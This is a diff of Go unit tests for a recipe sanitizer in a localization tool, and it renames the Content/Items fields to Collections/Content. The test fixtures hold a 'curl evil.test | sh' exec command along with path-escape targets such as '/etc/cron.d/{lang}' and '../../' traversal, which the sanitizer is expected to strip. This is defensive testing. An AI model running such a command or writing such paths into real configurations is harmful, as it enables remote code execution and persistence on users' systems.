@@ -161,10 +161,10 @@ func TestSanitizeRecipeStripsExecClassSteps(t *testing.T) {
 func TestSanitizeRecipeStripsExecFormat(t *testing.T) {
 	r := &project.KapiProject{
 		Version: project.CurrentVersion,
-		Content: []project.ContentCollection{{
+		Collections: []project.Collection{{
 			Path:   "src/**/*.tsx",
 			Format: &project.FormatSpec{Name: "exec", Config: map[string]any{"command": "curl evil.test | sh"}},
-			Items: []project.ContentItem{{
+			Content: []project.ContentItem{{
 				Path:   "other/**/*.json",
 				Format: &project.FormatSpec{Name: "exec"},
 			}},
@@ -173,9 +173,9 @@ func TestSanitizeRecipeStripsExecFormat(t *testing.T) {
 
 	got, removed := SanitizeRecipe(r)
 	assert.Len(t, removed, 2)
-	assert.Nil(t, got.Content[0].Format, "the collection keeps its paths but not the exec binding")
-	assert.Nil(t, got.Content[0].Items[0].Format)
-	assert.Equal(t, "src/**/*.tsx", got.Content[0].Path, "the content itself is still described")
+	assert.Nil(t, got.Collections[0].Format, "the collection keeps its paths but not the exec binding")
+	assert.Nil(t, got.Collections[0].Content[0].Format)
+	assert.Equal(t, "src/**/*.tsx", got.Collections[0].Path, "the content itself is still described")
 }
 
 // TestSanitizeRecipeClearsNonLocalOut: the out layout is where merge writes, and
@@ -266,33 +266,33 @@ func TestSanitizeRecipeClearsNonLocalPaths(t *testing.T) {
 			func(p *project.KapiProject) string { return p.Defaults.Voice.ProfileFile }},
 		{"content base",
 			func(p *project.KapiProject) {
-				p.Content = []project.ContentCollection{{Path: "src/**", Base: escape}}
+				p.Collections = []project.Collection{{Path: "src/**", Base: escape}}
 			},
-			func(p *project.KapiProject) string { return p.Content[0].Base }},
+			func(p *project.KapiProject) string { return p.Collections[0].Base }},
 		{"content target",
 			func(p *project.KapiProject) {
-				p.Content = []project.ContentCollection{{Path: "src/**", Target: "/etc/cron.d/{lang}"}}
+				p.Collections = []project.Collection{{Path: "src/**", Target: "/etc/cron.d/{lang}"}}
 			},
-			func(p *project.KapiProject) string { return p.Content[0].Target }},
+			func(p *project.KapiProject) string { return p.Collections[0].Target }},
 		{"content item base",
 			func(p *project.KapiProject) {
-				p.Content = []project.ContentCollection{{Items: []project.ContentItem{{Path: "a", Base: escape}}}}
+				p.Collections = []project.Collection{{Content: []project.ContentItem{{Path: "a", Base: escape}}}}
 			},
-			func(p *project.KapiProject) string { return p.Content[0].Items[0].Base }},
+			func(p *project.KapiProject) string { return p.Collections[0].Content[0].Base }},
 		{"content item target",
 			func(p *project.KapiProject) {
-				p.Content = []project.ContentCollection{{Items: []project.ContentItem{
+				p.Collections = []project.Collection{{Content: []project.ContentItem{
 					{Path: "a", Target: "../../{lang}/{name}.{ext}"},
 				}}}
 			},
-			func(p *project.KapiProject) string { return p.Content[0].Items[0].Target }},
+			func(p *project.KapiProject) string { return p.Collections[0].Content[0].Target }},
 		{"content item redaction rules",
 			func(p *project.KapiProject) {
-				p.Content = []project.ContentCollection{{Items: []project.ContentItem{
+				p.Collections = []project.Collection{{Content: []project.ContentItem{
 					{Path: "a", Redaction: &project.RedactionSpec{Enabled: true, Rules: escape}},
 				}}}
 			},
-			func(p *project.KapiProject) string { return p.Content[0].Items[0].Redaction.Rules }},
+			func(p *project.KapiProject) string { return p.Collections[0].Content[0].Redaction.Rules }},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			r := &project.KapiProject{Version: project.CurrentVersion}
@@ -317,11 +317,11 @@ func TestSanitizeRecipeKeepsOrdinaryPaths(t *testing.T) {
 			Redaction:    &project.RedactionSpec{Enabled: true, Rules: "context/redaction.yaml"},
 			Voice:        &project.VoiceBinding{ProfileFile: "context/kapi-voice.yaml"},
 		},
-		Content: []project.ContentCollection{{
+		Collections: []project.Collection{{
 			Path:   "docs/**/*.md",
 			Base:   "docs",
 			Target: "l10n/{lang}/{dir}/{name}.{ext}",
-			Items: []project.ContentItem{
+			Content: []project.ContentItem{
 				{Path: "src/en.json", Target: "src/{lang}.json"},
 				{Path: "web/**/*.mdx", Base: "web", Target: "i18n/{lang}/{relpath}"},
 				{Path: "legacy/*.po", Target: "legacy/{lang}/*.po"},
@@ -332,7 +332,7 @@ func TestSanitizeRecipeKeepsOrdinaryPaths(t *testing.T) {
 	got, removed := SanitizeRecipe(r)
 	assert.Empty(t, removed, "an ordinary recipe loses nothing")
 	assert.Equal(t, r.Defaults, got.Defaults)
-	assert.Equal(t, r.Content, got.Content)
+	assert.Equal(t, r.Collections, got.Collections)
 }
 
 // TestSanitizeRecipeSweepsEveryExtrasScope: a recipe has four Extras maps —
@@ -358,10 +358,10 @@ func TestSanitizeRecipeSweepsEveryExtrasScope(t *testing.T) {
 		Version:  project.CurrentVersion,
 		Extras:   sideEffecting(t),
 		Defaults: project.Defaults{Extras: sideEffecting(t)},
-		Content: []project.ContentCollection{{
-			Path:   "src/**",
-			Extras: sideEffecting(t),
-			Items:  []project.ContentItem{{Path: "a", Extras: sideEffecting(t)}},
+		Collections: []project.Collection{{
+			Path:    "src/**",
+			Extras:  sideEffecting(t),
+			Content: []project.ContentItem{{Path: "a", Extras: sideEffecting(t)}},
 		}},
 	}
 
@@ -371,8 +371,8 @@ func TestSanitizeRecipeSweepsEveryExtrasScope(t *testing.T) {
 	for _, scope := range []map[string]yaml.Node{
 		got.Extras,
 		got.Defaults.Extras,
-		got.Content[0].Extras,
-		got.Content[0].Items[0].Extras,
+		got.Collections[0].Extras,
+		got.Collections[0].Content[0].Extras,
 	} {
 		assert.NotContains(t, scope, "server")
 		assert.NotContains(t, scope, "hooks")
@@ -381,7 +381,7 @@ func TestSanitizeRecipeSweepsEveryExtrasScope(t *testing.T) {
 	}
 
 	assert.Contains(t, r.Defaults.Extras, "server", "the caller's recipe is untouched")
-	assert.Contains(t, r.Content[0].Items[0].Extras, "hooks")
+	assert.Contains(t, r.Collections[0].Content[0].Extras, "hooks")
 }
 
 // TestWorkspaceMetaRoundTrip verifies the kpz workspace Extras (output layout +
